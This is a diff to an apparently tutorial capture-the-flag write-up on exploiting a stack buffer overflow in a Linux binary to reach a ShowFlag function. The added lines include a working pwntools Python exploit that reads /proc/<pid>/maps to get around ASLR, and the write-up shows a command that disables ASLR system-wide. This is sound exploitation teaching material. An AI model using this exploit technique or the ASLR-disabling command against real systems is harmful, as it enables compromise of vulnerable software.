@@ -15,11 +15,6 @@ First up, we'll just get the flag really quickly using a debugger.
 
 Then we'll move on to exploiting a vulnerability in the code such that we can get the flag without the aid of the debugger.
 
-### Video
-
-If you're into that kind of thing...
-https://youtu.be/eFlXpYmOErk
-
 ## Tools
 
 To follow along here you'll want:
@@ -135,9 +130,9 @@ By hooking the debugger we can see that the program flow is interrupted by the s
 
 I did attempt to exploit the buffer overflow without turning off ASLR, but was unable to find a way to do so. I couldn't find a way to ret2plt or ret2libc (not that I'm skilled at doing so) on account of this assembly being Position Independent, thereby randomizing the location of .bss, .plt & .got sections of the assembly. 
 
-The closest I got was realising that I was able to perform a partial EIP overwrite to jump to a legitimate instruction, however it did not appear to go anywhere useful. I'm kind of hoping there is a way - and I'm just missing some learning...
+The closest I got was realising that I could 'workaround' ASLR by reading the processes maps file (in /proc/<pid>/maps) to determine the memory location of the binary itself. 
 
-To check that ASLR is off use
+For now though, to check that ASLR is off use
 ```
 cat /proc/sys/kernel/randomize_va_space
 ```
@@ -148,11 +143,11 @@ To change the state of ASLR use:
 echo 0 | tee /proc/sys/kernel/randomize_va_space
 ```
 
-While it is unlikely to be a 'real world' situation doing this, it is still instructive to do a simple 'ret'.
+While it is unlikely to be a 'real world' situation doing this, it is still instructive to learn the mechanics of a return.
 
 ### The 'ret' instruction
 
-The [ret instruction](http://www.felixcloutier.com/x86/RET.html) expects to take value at the top of the stack (pointed to by the stack pointer), and loads it into the instruction pointer, thus making that value, the next program instruction location. 
+The [ret instruction](http://www.felixcloutier.com/x86/RET.html) expects to take value at the top of the stack (pointed to by the stack pointer), and loads it into the instruction pointer, thus making that value, the next program instruction location. This is a simplified explanation - there is naunce in ["near and far"](http://oopweb.com/Assembly/Documents/ArtOfAssembly/Volume/Chapter_6/CH06-5.html#HEADING5-98) returns
 
 ![Using radare2 debugger in visual mode to show the operation of the AskQuestion function](../../images/r2-ask-question.png)
 
@@ -223,4 +218,68 @@ flag{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}
 
 Bus error
 
+```
+
+### Working around ASLR 
+
+The following isn't exactly an ASLR defeat, however it may provide a workaround for a user with insufficient privilege to turn ASLR completely off. 
+
+In our environment (Linux, x64) each process that gets created on our system writes a memory map to /proc/<pid>/maps, and the contents of a typical map file shows the memory locations like this:
+	
+```
+# cat /proc/<pid>/maps
+559a640a2000-559a640a3000 r-xp 00000000 fe:00 1049104                    /jim/binary
+559a642a2000-559a642a3000 r--p 00000000 fe:00 1049104                    /jim/binary
+559a642a3000-559a642a4000 rw-p 00001000 fe:00 1049104                    /jim/binary
+559a6443d000-559a6445e000 rw-p 00000000 00:00 0                          [heap]
+7f4be2b50000-7f4be2d01000 r-xp 00000000 fe:00 846058                     /lib/x86_64-linux-gnu/libc-2.27.so
+7f4be2d01000-7f4be2f00000 ---p 001b1000 fe:00 846058                     /lib/x86_64-linux-gnu/libc-2.27.so
+7f4be2f00000-7f4be2f04000 r--p 001b0000 fe:00 846058                     /lib/x86_64-linux-gnu/libc-2.27.so
+7f4be2f04000-7f4be2f06000 rw-p 001b4000 fe:00 846058                     /lib/x86_64-linux-gnu/libc-2.27.so
+7f4be2f06000-7f4be2f0a000 rw-p 00000000 00:00 0 
+7f4be2f0a000-7f4be2f2f000 r-xp 00000000 fe:00 846054                     /lib/x86_64-linux-gnu/ld-2.27.so
+7f4be30fe000-7f4be3100000 rw-p 00000000 00:00 0 
+7f4be312e000-7f4be312f000 r--p 00024000 fe:00 846054                     /lib/x86_64-linux-gnu/ld-2.27.so
+7f4be312f000-7f4be3130000 rw-p 00025000 fe:00 846054                     /lib/x86_64-linux-gnu/ld-2.27.so
+7f4be3130000-7f4be3131000 rw-p 00000000 00:00 0 
+7ffd9e426000-7ffd9e447000 rw-p 00000000 00:00 0                          [stack]
+7ffd9e589000-7ffd9e58c000 r--p 00000000 00:00 0                          [vvar]
+7ffd9e58c000-7ffd9e58e000 r-xp 00000000 00:00 0                          [vdso]
+```
+
+Each portion of the binary is in a random location. Again, using automation it is possible to read this at runtime (from a low privileged account)
+
+However, because only certain parts of the binary's memory location are randomized, we can trust that the ShowFlag always sits at the same _offset_
+
+In the previous example we saw that the last few higher order bits in the ShowFlag memory location were '796'
+
+So, we can leverage the maps file to do the following:
+
+```python
+#!/usr/bin/python2
+
+import pwn
+
+#create a tube to the binary
+proc = pwn.process('./binary')
+#retrieve the pid
+pid = proc.pid
+#we know that the location of the ShowFlag func *always* ends in 796
+magic='796'
+#open the PIDs maps file and
+maps = open('/proc/'+str(pid)+'/maps', 'r').read()
+#pinch the actual memory location (first 9 chars)
+desired_ret = int('0x'+ maps[0:9] + magic, 16)
+print 'desired ret: ' + hex(desired_ret)
+
+#commence finding the top of our stack buffer overflow
+offset = pwn.cyclic_find('faab')
+#load up our attack buffer
+buf = pwn.cyclic(offset)
+buf += pwn.p64(desired_ret)
+
+#send it rockin' down that tube
+proc.sendline(buf)
+#bazinga
+proc.interactive()
 ```
